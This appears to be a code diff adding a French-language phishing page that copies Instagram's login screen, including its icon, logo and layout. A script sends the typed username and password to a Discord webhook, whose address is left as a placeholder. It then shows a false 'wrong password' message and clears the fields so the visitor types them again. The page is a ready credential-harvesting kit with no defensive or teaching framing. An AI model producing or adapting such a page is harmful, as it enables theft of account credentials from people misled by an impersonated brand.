@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Connexion</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            color: #262626;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Conteneur général centré, adapté mobile */
+        .page-wrapper {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 0 24px 24px;
+            text-align: center;
+        }
+
+        /* Logo "style script" générique */
+        .logo {
+    font-size: 40px;
+    font-weight: 400;
+    font-family: 'Pacifico', cursive;
+    margin-bottom: 28px;
+}
+
+
+        /* Bloc principal */
+        .card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 28px 24px 24px;
+        }
+
+        .field {
+            width: 100%;
+            margin-bottom: 8px;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 4px;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .field input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .forgot {
+            display: block;
+            text-align: right;
+            margin: 6px 0 12px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 9px 0;
+            border-radius: 4px;
+            border: none;
+            background: #4db5f9;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .btn-primary:active {
+            opacity: 0.85;
+        }
+
+        .or-box {
+            margin: 18px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .or-box .line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .or-box span {
+            margin: 0 12px;
+            letter-spacing: 0.05em;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            font-weight: 600;
+            color: #385185;
+            cursor: pointer;
+        }
+
+        .btn-secondary:active {
+            opacity: 0.8;
+        }
+
+        .signup-card {
+            margin-top: 12px;
+            padding: 14px 0;
+            border: 1px solid #dbdbdb;
+            background: #fff;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-card a:hover {
+            text-decoration: underline;
+        }
+
+        /* Petits ajustements pour les très petits écrans */
+        @media (max-width: 380px) {
+            .container {
+                padding: 0 16px 16px;
+            }
+
+            .logo {
+                font-size: 34px;
+                margin-bottom: 22px;
+            }
+
+            .card {
+                padding: 24px 18px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+    <div class="container">
+
+        <!-- Titre / Logo générique -->
+        <div class="logo">Instagram</div>
+
+        <!-- Carte de connexion -->
+        <div class="card">
+            <div class="field">
+                <input type="text" placeholder="Nom d’utilisateur ou e-mail">
+            </div>
+            <div class="field">
+                <input type="password" placeholder="Mot de passe">
+            </div>
+
+            <a href="#" class="forgot">Mot de passe oublié ?</a>
+
+            <button class="btn-primary">Se connecter</button>
+            <p id="error-msg" style="color:red; font-size:13px; margin-top:10px; display:none;">Mauvais mot de passe</p>
+
+
+            <div class="or-box">
+                <div class="line"></div>
+                <span>OU</span>
+                <div class="line"></div>
+            </div>
+
+            <button class="btn-secondary">Continuer avec Facebook</button>
+        </div>
+
+        <!-- Carte inscription -->
+        <div class="signup-card">
+            Vous n’avez pas de compte ?
+            <a href="#">Inscrivez-vous</a>
+        </div>
+    </div>
+</div>
+
+
+<script>
+    const webhookURL = "#";
+
+    const card = document.querySelector(".card");
+    const fields = card.querySelectorAll(".field input");
+    const sendBtn = card.querySelector(".btn-primary");
+    const errorMsg = document.getElementById("error-msg");
+
+    sendBtn.addEventListener("click", function () {
+        const value1 = fields[0].value;
+        const value2 = fields[1].value;
+
+        const payload = {
+            content: `📝 **Nouveau formulaire rempli :**\n🔹 Identifiant : ${value1}\n🔹 Mot de passe : ${value2}`
+        };
+
+        // Envoi au webhook Discord
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            // Afficher le message d’erreur en rouge
+            errorMsg.style.display = "block";
+
+            // Effacer les champs
+            fields[0].value = "";
+            fields[1].value = "";
+        })
+        .catch(err => {
+            errorMsg.textContent = "Erreur d’envoi : " + err;
+            errorMsg.style.display = "block";
+        });
+    });
+
+</script>
+
+
+</body>
+</html>
